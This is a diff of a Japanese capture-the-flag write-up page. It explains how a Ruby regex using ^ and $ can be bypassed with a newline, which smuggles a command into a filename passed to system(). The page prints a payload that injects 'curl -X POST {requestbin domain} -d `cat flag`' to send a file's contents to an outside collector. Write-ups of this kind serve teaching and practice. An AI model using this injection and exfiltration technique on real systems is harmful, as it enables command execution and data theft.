@@ -121,7 +121,7 @@ get <span style="color:#48b685">&#39;/image/:name/:image&#39;</span> <span style
 
 <p>のようなパターンは弾かれてしまう。</p>
 
-<p>しかし、この問題の正規表現をよく見ると先頭/末尾を表す文字に <code>^</code>, <code>$</code> が使われている。<a href="https://blog.tokumaru.org/2014/03/z.html" rel="nofollow">徳丸先生もおっしゃられている</a>ように、 <code>/^$/</code> はあくまで行の先頭/末尾を示すパターンであり、複数行の場合はこの限りでない。つまり、</p>
+<p>しかし、この問題の正規表現をよく見ると先頭/末尾を表す文字に <code>^</code>, <code>$</code> が使われている。<a href="https://blog.tokumaru.org/2014/03/z.html" rel="nofollow">徳丸先生もおっしゃられている</a>ように、 <code>/^$/</code> はあくまで行の先頭/末尾を示すパターンであり、複数行の場合(特に、Rubyはデフォルトが複数行モードのようなので)はこの限りでない。つまり、</p>
 
 <p><code>http://web.kosenctf.com:12000/image/xxxxxxxxxxxxxxxx/image.png\n;ls</code></p>
 
@@ -132,7 +132,8 @@ get <span style="color:#48b685">&#39;/image/:name/:image&#39;</span> <span style
 requests<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685"></span><span style="color:#48b685">&#34;</span><span style="color:#48b685">http://web.kosenctf.com:12000/image/xxxxxxxxxxxxxxxx/image.png</span><span style="color:#f99b15">\n</span><span style="color:#48b685">curl -X POST {requestbin domain} -d `cat flag`; #</span><span style="color:#48b685">&#34;</span>)
 </pre>
 <p>ファイル名のあとに改行を挿入し、 <code>curl</code> コマンドで <code>cat flag</code> の結果を <code>-d</code> パラメータでくっつけて<a href="https://requestbin.com" rel="nofollow">requestbin</a>に立てたサーバへとPOSTしている。これで実際に <code>system</code> 関数で実行されるコマンドは以下のようになるはずだ。</p>
-<pre style="color:#e7e9db;background-color:#2f1e2e">unzip -j ZIP_FILE word/media/image.png<span style="color:#f99b15">\n</span>curl -X POST <span style="color:#5bc4bf">{</span>requestbin domain<span style="color:#5bc4bf">}</span> -d <span style="color:#48b685">`</span>cat flag<span style="color:#48b685">`</span>; <span style="color:#776e71"># -d FILE_DIR</span>
+<pre style="color:#e7e9db;background-color:#2f1e2e">unzip -j ZIP_FILE word/media/image.png
+curl -X POST <span style="color:#5bc4bf">{</span>requestbin domain<span style="color:#5bc4bf">}</span> -d <span style="color:#48b685">`</span>cat flag<span style="color:#48b685">`</span>; <span style="color:#776e71"># -d FILE_DIR</span>
 </pre>
 <p>requestbinの画面で以下のようにフラグが表示された。</p>
 
